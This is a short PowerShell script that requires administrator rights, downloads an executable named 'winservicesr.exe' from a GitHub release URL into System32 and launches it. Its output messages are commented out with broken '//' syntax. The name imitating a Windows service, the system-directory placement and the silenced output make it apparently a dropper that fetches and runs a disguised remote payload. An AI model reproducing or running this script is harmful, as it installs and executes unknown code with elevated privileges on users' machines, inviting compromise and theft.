# PowerShell script to download winservicesr.exe and run it from System32

# Ensure the script runs with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script requires administrative privileges. Please run PowerShell as Administrator."
    exit 1
}

# URL of the executable to download (replace with your actual URL)
$downloadUrl = "https://github.com/boradxshlok/AAOGL/releases/download/pussysss2/winservicesr.exe"

# Destination path in System32
$destinationPath = "$env:SystemRoot\System32\winservicesr.exe"

try {
    # Download the executable
    Write-Host "Downloading winservicesr.exe from $downloadUrl..."
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing

    # Verify the file was downloaded
    if (Test-Path $destinationPath) {
      //  Write-Host "Successfully downloaded winservicesr.exe to $destinationPath"

        # Run the executable
     //   Write-Host "Running winservicesr.exe..."
        Start-Process -FilePath $destinationPath -NoNewWindow
       // Write-Host "winservicesr.exe is now running."
    } else {
       // Write-Host "Error: Failed to download winservicesr.exe to $destinationPath"
        exit 1
    }
}
catch {
    //Write-Host "Error occurred: $_"
    exit 1
}
